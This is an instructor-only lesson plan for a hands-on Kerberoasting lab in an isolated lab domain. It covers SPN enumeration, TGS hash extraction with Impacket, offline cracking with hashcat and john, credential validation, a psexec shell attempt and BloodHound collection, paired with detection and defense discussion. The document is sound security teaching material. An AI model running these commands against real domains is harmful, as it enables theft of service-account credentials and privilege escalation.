# Lesson Plan — SCEN-002: Credential Access — Kerberoasting

**INSTRUCTOR ONLY — Do not distribute to students**

---

## Course Information

- **Scenario ID**: SCEN-002
- **Duration**: 3 hours (180 minutes)
- **Difficulty**: Intermediate
- **Class Size**: Up to 20 students (solo)
- **Team Format**: Individual — each student works in their own isolated lab slot
- **Prerequisites**: See below

### Student Prerequisites

- **Knowledge**: Active Directory fundamentals (domains, users, groups, OUs), Kerberos authentication basics (TGT vs TGS), Linux command line proficiency, familiarity with password hashing concepts
- **Tools**: Students should have prior exposure to at least one of: Impacket, crackmapexec, or ldapsearch. Hashcat/john experience is helpful but not required.
- **Lab Access**: Students must have an active portal account with an assigned lab slot

---

## Learning Objectives

By the end of this lab, students will be able to:

1. Enumerate Active Directory user accounts and identify service accounts with SPNs using LDAP queries and Impacket (T1087.002, T1069.002)
2. Execute a Kerberoasting attack by requesting TGS tickets for SPN-registered accounts and extracting crackable hashes (T1558.003)
3. Perform offline password cracking against Kerberos TGS-REP hashes using hashcat mode 13100 (T1110.002)
4. Validate cracked credentials by authenticating as the compromised service account
5. Explain why Kerberoasting works, what environmental conditions enable it, and what defenses mitigate it
6. Identify Windows Event ID 4769 as the primary detection artifact for Kerberoasting activity

---

## Pre-Class Preparation

### Instructor Setup (30 minutes before class)

1. Deploy scenario to all active student slots:
   - Portal: Admin > Lab Slots > Deploy All > Select `cred_access_kerberoasting`
   - Or CLI: `./scripts/deploy.sh --scenario cred_access_kerberoasting --all-slots`
2. Verify all VMs are running:
   - Portal dashboard should show `running` status for kali-attacker, dc01, ws01 in each slot
   - Spot-check 2-3 slots: confirm Kerberos (TCP/88) and LDAP (TCP/389) respond on dc01
3. Verify the SPN accounts exist:
   ```bash
   # From any kali-attacker, run a quick SPN check
   impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip>
   # Should return svc_sql and svc_backup
   ```
4. Distribute student access sheets (portal generates these automatically per slot)
5. Confirm rockyou.txt is present on all kali VMs: `/usr/share/wordlists/rockyou.txt`
6. Pre-load the briefing slides or SLIDES_CONTENT.md on the projector

### Student Materials to Distribute

- QUICK_REFERENCE.md (one-page cheat sheet — no spoilers)
- INCIDENT_REPORT_TEMPLATE.md (students fill this out as they work)
- Student access sheet with their slot's IP addresses and initial credentials (jsmith/Password123)

---

## Lesson Flow

### Opening: Briefing (20 minutes)

#### Instructor Presentation (15 minutes)

Present the following (see SLIDES_CONTENT.md for slide-by-slide details):

1. **Kerberos Authentication Overview**
   - TGT request flow (AS-REQ/AS-REP)
   - TGS request flow (TGS-REQ/TGS-REP) — emphasize that the TGS ticket is encrypted with the service account's password hash
   - Draw or display the Kerberos flow diagram on the board

2. **Service Principal Names (SPNs)**
   - What they are: identifiers that tie a service to an AD account
   - Why they exist: Kerberos needs to know which account's key to use for the TGS ticket
   - The problem: any authenticated domain user can request a TGS ticket for any SPN

3. **The Kerberoasting Attack**
   - Step 1: Authenticate with any domain credential
   - Step 2: Query AD for accounts with SPNs
   - Step 3: Request TGS tickets — the DC gives you an encrypted blob, no questions asked
   - Step 4: Crack the blob offline — if the password is weak, you win
   - Key insight: this is by-design Kerberos behavior, not an exploit

4. **Real-World Context**
   - Kerberoasting appears in >50% of enterprise AD compromises
   - Used by APT29, FIN6, Wizard Spider, and many others
   - Requires only a single low-privilege domain credential — no admin access, no network noise beyond normal Kerberos traffic
   - Often the pivot point between "low-privilege foothold" and "domain admin"

#### Discussion (5 minutes)

- "Why would an organization have service accounts with SPNs in the first place?"
  - Expected answer: services like SQL Server, IIS, Exchange register SPNs so clients can authenticate via Kerberos instead of NTLM. It is legitimate infrastructure, not a misconfiguration.
- "If SPNs are legitimate, where does the vulnerability actually come from?"
  - Expected answer: the vulnerability is the weak password on the service account, combined with the fact that any domain user can request a TGS ticket. The SPN just makes the account targetable.

---

### Phase 1: Domain Enumeration (35 minutes)

**ATT&CK Techniques**: T1087.002 (Account Discovery: Domain Account), T1069.002 (Permission Groups Discovery: Domain Groups)

**What the adversary does**: After obtaining initial domain credentials (often through phishing), the attacker enumerates the AD environment to identify high-value targets — service accounts, admin groups, trust relationships.

**Why it works**: LDAP queries are a normal part of domain operations. Every domain-joined machine makes them. There is no authentication gate beyond having a valid domain account — even a low-privilege one.

#### Student Task

> Using the jsmith credentials (Password123), authenticate to the domain controller and enumerate all domain users. Identify which accounts have Service Principal Names (SPNs) registered. Document the SPNs you find.

#### Instructor Walkthrough (use if students are stuck after 15 minutes)

1. Verify credentials work:
   ```bash
   crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local
   ```
2. Enumerate domain users via LDAP:
   ```bash
   ldapsearch -H ldap://<dc01_ip> -D "jsmith@lab.local" -w "Password123" \
     -b "DC=lab,DC=local" "(objectClass=user)" sAMAccountName description memberOf
   ```
3. Find SPN accounts:
   ```bash
   impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip>
   ```
4. Alternative — crackmapexec user enumeration:
   ```bash
   crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local --users
   ```

Students should find: `svc_sql` (with `MSSQLSvc/dc01.lab.local`) and `svc_backup` (with `WBEM/dc01.lab.local`).

#### Detection Checkpoint

Pause and ask: "If you were a defender, what would you see right now?"

- Expected answer: LDAP queries from the kali-attacker IP to dc01. Windows Security Event ID 4662 (directory service access) and Event ID 4624 (logon) for jsmith from an unusual source IP.
- Follow-up: "Would this trigger an alert in most organizations?"
- Expected answer: Probably not — LDAP queries are normal. This is why enumeration is hard to detect without baselining normal query patterns.

#### Hints (push via portal if students are stuck)

- **Hint 1** (direction): "Start by verifying your credentials work. Try connecting to the DC using crackmapexec."
- **Hint 2** (approach): "Use impacket-GetUserSPNs with just the domain credentials and DC IP. No -request flag yet — just enumerate first."
- **Hint 3** (near-answer): "Run: `impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip>` — this lists all accounts with SPNs."

---

### Phase 2: Kerberoasting — TGS Ticket Extraction (30 minutes)

**ATT&CK Technique**: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

**What the adversary does**: Requests TGS tickets for all SPN-registered accounts. The DC issues these tickets encrypted with each service account's password hash. The attacker saves these encrypted tickets for offline cracking.

**Why it works**: Kerberos is designed to give any authenticated user a TGS ticket for any service they request — the DC does not check whether the user actually needs access to that service. The encryption on the ticket uses the service account's long-term key (derived from its password), making it crackable if the password is weak.

#### Student Task

> Request TGS tickets for all SPN accounts you identified. Save the ticket hashes to a file in hashcat-compatible format. Examine the hash format and identify the encryption type.

#### Instructor Walkthrough (use if students are stuck after 10 minutes)

1. Request TGS tickets with hash output:
   ```bash
   impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip> \
     -request -outputfile kerberoast_hashes.txt
   ```
2. Examine the hashes:
   ```bash
   cat kerberoast_hashes.txt
   ```
   Each line starts with `$krb5tgs$23$` — the `23` indicates RC4 encryption (etype 23). This is the weakest Kerberos encryption and the easiest to crack.

3. Count the hashes:
   ```bash
   wc -l kerberoast_hashes.txt
   ```
   Should be 2 lines (svc_sql and svc_backup).

#### Detection Checkpoint

Pause and ask: "What just happened on the domain controller? What would a defender see?"

- Expected answer: Windows Security Event ID 4769 — Kerberos Service Ticket Operations. Two TGS requests from jsmith's session, both with encryption type 0x17 (RC4).
- Key teaching point: "Normal service account TGS requests come from the server running the service — not from a user workstation or a Kali box. Two RC4 TGS requests from an unusual IP in rapid succession is a strong Kerberoasting indicator."
- Ask: "Why RC4 specifically? What if AES was enforced?"
- Expected answer: RC4 hashes are faster to crack by orders of magnitude. AES-256 TGS tickets are still crackable in theory but take far longer — making strong passwords even more critical.

#### Hints

- **Hint 1** (direction): "You already found the SPN accounts. Now ask the DC for their TGS tickets. GetUserSPNs.py has a flag for this."
- **Hint 2** (approach): "Add the `-request` flag to your previous GetUserSPNs command. Use `-outputfile` to save the hashes."
- **Hint 3** (near-answer): "Run: `impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip> -request -outputfile kerberoast_hashes.txt`"

---

### Phase 3: Offline Password Cracking (35 minutes)

**ATT&CK Technique**: T1110.002 (Brute Force: Password Cracking)

**What the adversary does**: Takes the extracted TGS ticket hashes offline — completely disconnected from the target network — and cracks them using GPU-accelerated tools and wordlists. No account lockout policies apply because the cracking happens locally.

**Why it works**: The TGS ticket is encrypted with the service account's password hash. If the password is in a common wordlist (or derivable through rules), hashcat will find it. There is zero network traffic during cracking — the target organization has no visibility into this phase.

#### Student Task

> Crack the TGS ticket hashes using hashcat (mode 13100) or john with the rockyou.txt wordlist. Document which accounts crack and how long it takes. Then validate the cracked credentials by authenticating as the service account.

#### Instructor Walkthrough (use if students are stuck after 15 minutes)

1. Crack with hashcat:
   ```bash
   hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
   ```
   If the lab VM lacks a GPU, hashcat will fall back to CPU mode. This is fine — `Summer2024!` is near the top of rockyou.txt and will crack quickly regardless.

2. Alternative — crack with john:
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
   ```

3. Expected results:
   - `svc_sql`: Cracks to `Summer2024!` — typically under 5 minutes with rockyou.txt
   - `svc_backup`: Will NOT crack with rockyou.txt — `B4ckup$ecure2024` is not in standard wordlists

4. Validate the cracked password:
   ```bash
   crackmapexec smb <dc01_ip> -u svc_sql -p 'Summer2024!' -d lab.local
   ```

5. Check what svc_sql can access:
   ```bash
   crackmapexec smb <dc01_ip> -u svc_sql -p 'Summer2024!' -d lab.local --shares
   ```

6. Attempt to get a shell:
   ```bash
   impacket-psexec lab.local/svc_sql:'Summer2024!'@<dc01_ip>
   ```

#### Detection Checkpoint

Pause and ask: "Can the defender see the cracking phase?"

- Expected answer: No. Offline cracking generates zero network traffic. The defender's only window was Phase 2 — the TGS request. Once the attacker has the hash, the defender has lost the race.
- Key teaching point: "This is why detection must happen at the TGS request stage, not the cracking stage. By the time the attacker uses the cracked credential, you have a valid-looking authentication event from a legitimate service account. The anomaly window is narrow."
- Ask: "What about the post-cracking authentication? What would Event ID 4624 show?"
- Expected answer: A logon event for svc_sql from the attacker's IP — this might be detectable if svc_sql normally only authenticates from specific servers. But many orgs do not baseline service account authentication sources.

#### Hints

- **Hint 1** (direction): "You have the hash file from Phase 2. Now use a password cracking tool — hashcat or john — with a wordlist."
- **Hint 2** (approach): "Hashcat mode 13100 handles Kerberos 5 TGS-REP (RC4) hashes. The rockyou.txt wordlist is at /usr/share/wordlists/rockyou.txt."
- **Hint 3** (near-answer): "Run: `hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt` — one of the two accounts should crack quickly."

---

### Phase 4: BloodHound AD Mapping — Bonus (20 minutes)

**ATT&CK Techniques**: T1087.002 (Account Discovery), T1069.002 (Permission Groups Discovery)

**What the adversary does**: Uses BloodHound to ingest the entire AD structure and graph all possible attack paths from the compromised account to Domain Admin. This reveals lateral movement opportunities, group membership chains, and delegation misconfigurations.

**Why it works**: AD relationships are complex. BloodHound automates the discovery of attack paths that would take hours to find manually. Defenders rarely have equivalent visibility into their own AD topology.

#### Student Task (Bonus — for students who finish early)

> Run BloodHound's data collector (bloodhound-python) using jsmith's credentials. Import the results into BloodHound. Find the shortest path from jsmith to Domain Admins. Document the path.

#### Instructor Walkthrough

1. Collect AD data:
   ```bash
   bloodhound-python -d lab.local -u jsmith -p 'Password123' \
     -ns <dc01_ip> -c all
   ```
2. This generates JSON files in the current directory. In a full lab, students would import these into the BloodHound GUI.
3. The key query: "Shortest Path from jsmith to Domain Admins" — this shows whether the Kerberoasted svc_sql account has any path to DA (through group memberships, ACL abuse, etc.).

#### Detection Checkpoint

- "BloodHound collection generates a large volume of LDAP queries in a short time. How would that look to a defender?"
- Expected answer: A burst of LDAP queries from a single source IP covering every object type in AD. LDAP query volume baselining or tools like MDI (Microsoft Defender for Identity) flag this pattern.

#### Hints

- **Hint 1** (direction): "BloodHound has a Python-based data collector called bloodhound-python. It uses the same domain credentials you have."
- **Hint 2** (approach): "Run bloodhound-python with -c all to collect everything. Point -ns at the DC IP."
- **Hint 3** (near-answer): "Run: `bloodhound-python -d lab.local -u jsmith -p 'Password123' -ns <dc01_ip> -c all`"

---

### Debrief (30 minutes)

#### Attack Chain Reconstruction (10 minutes)

Walk through the full attack chain on the whiteboard:

```
jsmith (low-priv domain user)
    |
    v
[1] LDAP enumeration → discovered svc_sql and svc_backup SPNs
    |
    v
[2] TGS ticket request → DC issued RC4-encrypted tickets (by design)
    |
    v
[3] Offline cracking → svc_sql password cracked (Summer2024!)
    |       svc_backup password NOT cracked (strong password)
    v
[4] Service account access → svc_sql grants access to SQL admin share
```

Ask students to compare approaches:
- Who used crackmapexec vs. ldapsearch for enumeration?
- Who used hashcat vs. john for cracking?
- Did anyone try rules or mangling beyond straight dictionary attack?

#### Detection Discussion (10 minutes)

Guided questions:

1. "At which phase did the defender have the best chance of detecting this attack?"
   - Answer: Phase 2 — the TGS ticket request. Event ID 4769 with RC4 encryption from an unusual source.

2. "Why is Phase 3 invisible to the defender?"
   - Answer: Offline cracking happens on the attacker's machine. Zero network traffic. No failed login attempts. No account lockout triggers.

3. "If you were setting up monitoring, what specific detection rule would you write?"
   - Answer: Alert on Event ID 4769 where Ticket Encryption Type = 0x17 (RC4) AND the source IP is not in the list of servers that normally request TGS tickets for that SPN.

4. "What is a honeypot SPN and why would you deploy one?"
   - Answer: A fake service account with an SPN that no legitimate service uses. Any TGS request for this SPN is guaranteed malicious — it is a high-fidelity detection with zero false positives.

#### Defenses Deep Dive (10 minutes)

Walk through the defense stack:

1. **Group Managed Service Accounts (gMSA)**: 120-character randomly generated passwords that rotate every 30 days. Cannot be Kerberoasted — the password is too complex to crack.

2. **AES Encryption Enforcement**: Configure service accounts to use AES-256 instead of RC4. AES TGS tickets are much harder to crack, but not impossible — this buys time, it does not eliminate the risk.

3. **Strong Passwords on Service Accounts**: If gMSA is not possible (legacy applications), service account passwords must be 25+ characters. `Summer2024!` should never exist in production.

4. **Monitoring Event ID 4769**: Build detection rules for anomalous TGS patterns — RC4 requests, bulk requests, requests from unusual sources.

5. **Honeypot SPNs**: Deploy fake service accounts with SPNs and alerting. Any TGS request = guaranteed attacker. This is one of the highest-fidelity detections available in AD environments.

Ask: "Why did svc_backup survive this attack?"
- Answer: Its password (`B4ckup$ecure2024`) is not in rockyou.txt. Password strength is the last line of defense when the attacker has the hash.

---

## Assessment Rubric

| Criterion | Points | How to Verify |
|---|---|---|
| Enumerated domain users and identified both SPN accounts | 15 | Student's incident report lists svc_sql and svc_backup with their SPNs |
| Successfully extracted TGS ticket hashes to a file | 20 | kerberoast_hashes.txt file containing 2 valid $krb5tgs$ hashes |
| Cracked svc_sql password (Summer2024!) | 20 | Hashcat or john output showing cracked password, or screenshot of successful auth |
| Validated cracked credentials (authenticated as svc_sql) | 15 | crackmapexec output showing `[+]` for svc_sql, or share enumeration output |
| Completed incident report with ATT&CK mapping | 15 | All 4 techniques (T1087.002, T1069.002, T1558.003, T1110.002) correctly mapped |
| Explained Kerberoasting defense recommendations | 10 | Written explanation includes at least 3 defenses (gMSA, AES, strong passwords, monitoring, honeypot SPNs) |
| Bonus: BloodHound AD path mapping | 5 | BloodHound collection output files or screenshot of attack path graph |
| **Total** | **100** | |

**Grading thresholds**: 90+ = Exceeds expectations, 70-89 = Meets expectations, 50-69 = Approaching, <50 = Needs remediation

---

## Contingency Plans

### If Students Finish Early

- Have them complete the BloodHound bonus objective
- Challenge them to write a Sigma rule or Splunk query that detects Kerberoasting based on Event ID 4769 patterns
- Ask them to attempt cracking svc_backup using hashcat rules (`-r /usr/share/hashcat/rules/best64.rule`) — it should still fail, but the exercise teaches rule-based cracking
- Have them research and document AS-REP Roasting (T1558.004) — the related technique for accounts without pre-authentication

### If Students Are Stuck

- Use the 3-level hint system via the portal dashboard to push targeted hints to specific slots
- After 15 minutes stuck on any phase, walk to the student and provide the Hint 2 for that phase verbally
- After 25 minutes stuck, demonstrate the step on the projector for the whole class — some students learn better from watching first
- Never give the final answer directly — guide toward the next discovery step

### If Infrastructure Fails

- **Single VM down**: Admin > Lab Slots > select slot > Reset to Baseline (~2 min)
- **Reset fails**: Admin > Lab Slots > Destroy > Redeploy (~5 min)
- **Multiple slots down**: Use instructor's own slot to demonstrate on the projector while slots are redeployed
- **DC not responding to Kerberos**: SSH to dc01, verify AD DS service is running: `Get-Service NTDS`. If stopped, restart it. If the domain is broken, destroy and redeploy the slot.
- **Hashcat not found on kali**: `sudo apt install -y hashcat` — or fall back to john
- **rockyou.txt missing**: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` or download from the kali repo

### If Time Runs Short

- Priority order: Phase 1 + Phase 2 + Phase 3 are mandatory (core learning). Phase 4 (BloodHound) is expendable.
- If debrief time is compressed, focus on the detection discussion — it has the highest training value for blue team skills.
- Assign the incident report as homework if classroom time runs out.

---

## Post-Class

1. Collect incident reports from all students (via portal or email)
2. Review for common misunderstandings — especially around why RC4 vs AES matters and why offline cracking is invisible
3. Destroy all lab slots: Admin > Lab Slots > Destroy All
4. Log the class completion in the portal audit log
